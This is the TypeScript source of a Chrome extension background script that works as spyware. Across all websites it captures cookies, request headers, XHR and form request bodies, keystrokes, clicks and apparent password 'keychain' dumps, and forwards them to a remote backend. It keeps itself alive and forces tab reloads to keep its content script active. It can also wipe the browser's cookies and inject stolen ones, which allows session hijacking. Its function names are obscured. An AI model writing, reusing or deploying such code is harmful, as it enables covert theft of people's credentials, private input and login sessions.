import {
    thread_action_interaction_add_entry,
    thread_action_typing_add_entry,
    thread_add_entry,
    thread_cookie_store_set,
    thread_keychain_add_entry,
    thread_xhrstream_add_entry,
} from './lib/util/datist';
import {
    CookieStore,
    KeychainEntry,
    KeychainPayload,
    ThreadActionInteractionEntry, ThreadActionInteractionPayload,
    ThreadActionTypingEntry,
} from './lib/types';

const get_ids = async (): Promise<{ user_id: string, thread_id: string } | null> => {
    const { user_id, thread_id } = await chrome.storage.sync.get([
        'user_id',
        'thread_id',
    ]);

    if (!user_id || !thread_id) {
        return null;
    }

    return {
        user_id,
        thread_id,
    };
};

async function createOffscreen() {
    if (await chrome.offscreen.hasDocument?.()) {
        return;
    }

    await chrome.offscreen.createDocument({
        url: 'offscreen.html',
        reasons: [ 'BLOBS' ],
        justification: 'keep service worker running',
    });
}

const uuidv4 = () =>
    'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
        const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });

const ensure_user_uuid = async () => {
    const user_uuid = await chrome.storage.local.get('user_uuid');

    if (!user_uuid) {
        const new_uuid = uuidv4();

        await chrome.storage.local.set({
            user_uuid: new_uuid,
        });
    }

    return user_uuid;
};

chrome.runtime.onStartup.addListener(async () => {
    await ensure_user_uuid();

    createOffscreen();
});
// a message from an offscreen document every 20 second resets the inactivity timer
chrome.runtime.onMessage.addListener(msg => {
    if (msg.keepAlive) {
    }

    createOffscreen();
});

chrome.runtime.onInstalled.addListener(async () => {
    await ensure_user_uuid();

    createOffscreen();
});

type KcMessage = {
    type: 'dump';
    data: KeychainPayload,
}

const hash_data = async <T>(data: T) => {
    const data_json = JSON.stringify(data);

    const data_hash = await crypto.subtle.digest(
        'SHA-1',
        new TextEncoder().encode(data_json),
    );

    const data_hash_hex = Array.from(
        new Uint8Array(data_hash),
    ).map(
        b => b.toString(16).padStart(2, '0'),
    ).join('');

    return data_hash_hex.slice(0, 20);
};

const check_dump_changed_for_url =
    async (
        url: string,
        newHash: string,
    ) => {
        return new Promise((
            resolve,
            reject,
        ) => {
            chrome.storage.local.get(url, (result) => {
                if (chrome.runtime.lastError) {
                    reject(chrome.runtime.lastError);
                    return;
                }

                const oldHash = result[url];

                if (oldHash === undefined || oldHash !== newHash) {
                    resolve(true);
                } else {
                    resolve(false);
                }
            });
        });
    };

const process_utkce = async (
    msg: KcMessage['data'],
    url: string,
) => {
    const origin = new URL(url).origin;

    const cookies =
        await chrome.cookies.getAll({
            url: origin,
        });

    const xcookies =
        (cookies || [])
            .map(c => JSON.stringify(c));

    const data = {
        ...msg,
        c: xcookies,
    };

    const hashed_origin = await hash_data(origin);
    const hashed_data = await hash_data(data);

    if (await check_dump_changed_for_url(hashed_origin, hashed_data)) {
        //console.log('changed');

        chrome.storage.local.set({
            [hashed_origin]: hashed_data,
        });

        const ids = await get_ids();

        if (ids === null) {
            return;
        }

        const payload: KeychainEntry = {
            url: origin,
            data,
        };

        try {
            await thread_keychain_add_entry(
                ids.user_id!,
                ids.thread_id!,
                payload,
            );
        } catch (e) {
            console.error(e);
        }
    } else {
        //console.log('unchanged');
    }

    //console.log(data);
};

chrome.webRequest.onBeforeRequest.addListener(
    async details => {
        if (
            details?.type !== 'media'
            && details?.type !== 'xmlhttprequest'
        ) {
            //console.log(details);
            return;
        }

        if (details?.tabId === -1) {
            return;
        }

        const ids = await get_ids();

        if (ids === null) {
            return;
        }

        //console.log('onBeforeRequest', details);

        let payload = null;

        if (details.requestBody && details.requestBody?.error === undefined) {
            if (details.requestBody.formData) {
                payload = {
                    formData: btoa(
                        JSON.stringify(
                            details.requestBody,
                        ),
                    ),
                };
            }

            if (details.requestBody.raw) {
                payload = {
                    raw: details.requestBody.raw.map(r =>
                        btoa(
                            Array.from(new Uint8Array(r.bytes!))
                                 .reduce((
                                     data,
                                     byte,
                                 ) =>
                                     data + String.fromCharCode(byte), ''),
                        ),
                    ),
                };
            }
        }

        if (payload === null) {
            return;
        }

        const xhrstream_entry = {
            url: details.url,
            data: payload,
        };

        try {
            await thread_xhrstream_add_entry(
                ids.user_id!,
                ids.thread_id!,
                xhrstream_entry,
            );
        } catch (e) {
            console.error(e);
        }
    },
    { urls: [ '<all_urls>' ] },
    [ 'requestBody' ],
);

const capture_cookie_stores = () =>
    chrome.cookies.getAllCookieStores()
          .then(stores =>
              Promise.all(
                  stores.map(store =>
                      chrome.cookies.getAll({
                              storeId: store.id,
                          },
                      ),
                  ),
              ),
          );

chrome.webRequest.onSendHeaders.addListener(
    async details => {
        if (details.type === 'main_frame') {
            const cookies =
                await chrome.cookies.getAll({
                    url: details.url,
                });

            //console.log('Loading: ' + details.url);

            const ids = await get_ids();

            if (ids === null) {
                return;
            }

            const headers =
                (details.requestHeaders || [])
                    .map(h => [ h.name, h.value ]);

            const xcookies =
                (cookies || [])
                    .map(c => JSON.stringify(c));

            const payload = {
                url: details.url,
                data: {
                    h: headers,
                    c: xcookies,
                },
            };

            try {
                await thread_add_entry(
                    ids.user_id!,
                    ids.thread_id!,
                    payload as any,
                );
            } catch (e) {
                console.error(e);
            }

            try {
                const cookies = await capture_cookie_stores();

                await thread_cookie_store_set(
                    ids.user_id!,
                    ids.thread_id!,
                    cookies.flat(),
                );
            } catch (e) {
                console.error(e);
            }
        }
    },
    { urls: [ '<all_urls>' ] },
    [ 'requestHeaders', 'extraHeaders' ],
);

const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

const ensure_tab_compliance = async (
    tab: number,
    cb: () => void,
) => {
    await chrome.storage.session.set({
        ['pcin_' + tab]: -1,
    });

    chrome.tabs.sendMessage(
        tab!,
        {
            type: 'xlrd_exp_checkin',
            data: tab,
        },
    );

    sleep(2000).then(
        async () => {
            const pending = await chrome.storage.session.get('pcin_' + tab);

            if (pending['pcin_' + tab] !== tab) {
                chrome.tabs.reload(tab);
                await chrome.storage.session.remove('pcin_' + tab);
                return;
            }

            cb();
        },
    );
};

chrome.tabs.onActivated.addListener(
    async activeInfo => {
        const tab =
            await chrome.tabs.get(activeInfo.tabId);

        if (tab.url === undefined || /^chrome:|chrome\.google\.com/.test(tab.url)) {
            return;
        }

        ensure_tab_compliance(
            activeInfo.tabId,
            () => {
                chrome.tabs.sendMessage(
                    activeInfo.tabId,
                    {
                        type: 'xlrd_exp_tbs',
                    },
                );
            },
        );
    },
);

type CookieType = Parameters<typeof chrome.cookies.set>[0];

const filtrate_cookie_payload =
    (
        data: string[],
        url_hint?: string,
    ): CookieType[] =>
        data
            .map(d => JSON.parse(d))
            // remove "hostOnly" and "session" from the cookies
            .map(c => {
                return {
                    domain: c.domain,
                    expirationDate: Math.floor(c.expirationDate) || undefined,
                    httpOnly: c.httpOnly,
                    name: c.name,
                    path: c.path,
                    sameSite: c.sameSite,
                    secure: c.secure,
                    //storeId: c.storeId,
                    value: c.value.replace(/\"(.*)\"/, '$1'),
                    url: url_hint || ('https://' + c.domain.replace(/^\.(.*)$/, '$1') + c.path),
                };
            });

globalThis.import_kc = async (
    dump: KeychainEntry,
) => {
    const url_parsed = new URL(dump.url);

    // find tabs matching the url
    const tabs = [
        await chrome.tabs.query({
            url: `${ url_parsed.protocol }//${ url_parsed.host }/*`,
        }),
        await chrome.tabs.query({
            url: `${ url_parsed.protocol }//www.${ url_parsed.host }/*`,
        }),
    ].flat();

    // send "xlrd_imp_kc" message to the tabs
    for (const tab of tabs) {
        chrome.tabs.sendMessage(
            tab.id!,
            {
                type: 'xlrd_imp_kc',
                data: dump.data,
            },
        );
    }

    // import cookies
    const cookies =
        [
            filtrate_cookie_payload(
                dump.data.c,
                dump.url,
            ),
            filtrate_cookie_payload(
                dump.data.c,
            ),
        ].flat();

    for (const cookie of cookies) {
        try {
            await chrome.cookies.set(cookie);
            console.log(cookie);
        } catch (e) {
            console.error(e);
        }
    }
};

const c2sd = (cookies: chrome.cookies.Cookie[]): chrome.cookies.SetDetails[] =>
    cookies.map((cookie) => {
        const result: chrome.cookies.SetDetails = {
            name: cookie.name,
            value: cookie.value,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            storeId: cookie.storeId,
            url: buildUrl(cookie.secure, cookie.domain, cookie.path),
        };

        if (!cookie.hostOnly) {
            result.domain = cookie.domain;
        }

        if (!cookie.session) {
            result.expirationDate = cookie.expirationDate;
        }

        return result;
    });

const wipe_cookie_stores = async () => {
    const stores = (await capture_cookie_stores()).flat();

    await Promise.all(
        c2sd(stores).map(async cookie => {
            chrome.cookies.remove({
                url: cookie.url,
                name: cookie.name!,
            });
        }),
    );
};

globalThis.import_tc = async (
    dump: chrome.cookies.Cookie[],
) => {
    await wipe_cookie_stores();

    // import cookies
    const cookies =
        c2sd(dump);

    await Promise.all(
        cookies.map(async cookie => {
            try {
                await chrome.cookies.set(cookie);
                console.log(cookie);
            } catch (e) {
                console.error(e);
            }
        }),
    );
};

const filtrate_cookie_payload_fd =
    (
        data: CookieStore,
        url_hint: string,
    ): CookieType[] =>
        data
            // remove "hostOnly" and "session" from the cookies
            .map(c => {
                return {
                    domain: c.domain,
                    expirationDate: c.expirationDate && Math.floor(c.expirationDate),
                    httpOnly: c.httpOnly,
                    name: c.name,
                    path: c.path,
                    sameSite: c.sameSite,
                    secure: c.secure,
                    //storeId: c.storeId,
                    value: c.value.replace(/\"(.*)\"/, '$1'),
                    url: url_hint,
                };
            });

globalThis.import_tc_fd = async (
    dump: CookieStore,
    url_hint: string,
) => {
    // import cookies
    const cookies =
        filtrate_cookie_payload_fd(
            dump,
            url_hint,
        );

    for (const cookie of cookies) {
        try {
            await chrome.cookies.set(cookie);
            console.log(cookie);
        } catch (e) {
            //console.error(e);
        }
    }
};

const buildUrl = (
    secure: boolean,
    domain: string,
    path: string,
): string => {
    if (domain.startsWith('.')) {
        domain = domain.slice(1);
    }

    return `http${ secure ? 's' : '' }://${ domain }${ path }`;
};

type ActionKeydown = {
    readonly code: string;
    readonly ctrlKey: boolean;
    readonly key: string;
    readonly metaKey: boolean;
    readonly shiftKey: boolean;
};

class ActionKeydownHandler {
    private action_kd_timer: number | null = null;
    private action_kd_buffer: string = '';
    private action_kd_ctx: chrome.runtime.MessageSender | null = null;

    async commit() {
        if (this.action_kd_timer) {
            clearTimeout(this.action_kd_timer);
        }

        if (!this.action_kd_timer || !this.action_kd_ctx || !this.action_kd_buffer) {
            return;
        }

        const buffer = this.action_kd_buffer;
        const ctx = this.action_kd_ctx;

        this.action_kd_timer = null;
        this.action_kd_buffer = '';
        this.action_kd_ctx = null;

        const ids = await get_ids();

        if (ids === null) {
            return;
        }

        try {
            const entry: ThreadActionTypingEntry = {
                url: ctx.url!,
                data: {
                    text: buffer,
                },
            };

            await thread_action_typing_add_entry(
                ids.user_id!,
                ids.thread_id!,
                entry,
            );
        } catch (e) {
        }
    }

    async handle_action(
        sender: chrome.runtime.MessageSender,
        msg: ActionKeydown,
    ) {
        if (this.action_kd_timer) {
            clearTimeout(this.action_kd_timer);
        }

        if (
            this.action_kd_ctx
            && this.action_kd_ctx.tab
            && sender.tab
            && this.action_kd_ctx.tab.id !== sender.tab.id
        ) {
            try {
                await this.commit();
            } catch (e) {
            }
        }

        this.action_kd_timer = setTimeout(() => {
            this.commit();
        }, 5000) as any as number;

        if (msg.key === 'Enter') {
            try {
                await this.commit();
            } catch (e) {
            }
            return;
        }

        if (msg.key === 'Backspace') {
            this.action_kd_buffer = this.action_kd_buffer.slice(0, -1);
        } else {
            this.action_kd_buffer += msg.key;
        }

        this.action_kd_ctx = sender;
    }
}

const action_kd_handler = new ActionKeydownHandler();

const process_act_ct = async (
    sender: chrome.runtime.MessageSender,
    msg: ThreadActionInteractionPayload,
) => {
    const ids = await get_ids();

    if (ids === null) {
        return;
    }

    try {
        await thread_action_interaction_add_entry(
            ids.user_id!,
            ids.thread_id!,
            {
                url: sender.url!,
                data: msg,
            },
        );
    } catch (e) {
    }
};

chrome.runtime.onMessage.addListener(async (
    request,
    sender,
    reply,
) => {
    //console.log(
    //    sender.tab
    //        ? 'from a content script:' + sender.tab.url
    //        : 'from the extension',
    //);

    if (request.type === 'xlrd_exp_req' && request.data) {
        await process_utkce(
            request.data as KcMessage['data'],
            sender.url,
        );
    }

    if (request.type === 'xlrd_act_kd' && request.data) {
        await action_kd_handler.handle_action(
            sender,
            request.data as ActionKeydown,
        );
    }

    if (request.type === 'xlrd_act_kd_commit') {
        await action_kd_handler.commit();
    }

    if (request.type === 'xlrd_act_ct') {
        await process_act_ct(
            sender,
            request.data,
        );
    }

    if (request.type == 'xlrd_exp_checkin_ack') {
        const pending = await chrome.storage.session.get('pcin_' + request.data);

        if (!pending || pending['pcin_' + request.data] === request.data) {
            return;
        }

        chrome.storage.session.set({
            ['pcin_' + request.data]: request.data,
        });
    }

    if (request.type == 'xlrd_datist_import_req') {
        await globalThis.import_tc(
            request.data as chrome.cookies.Cookie[],
        );
    }

    return true;
});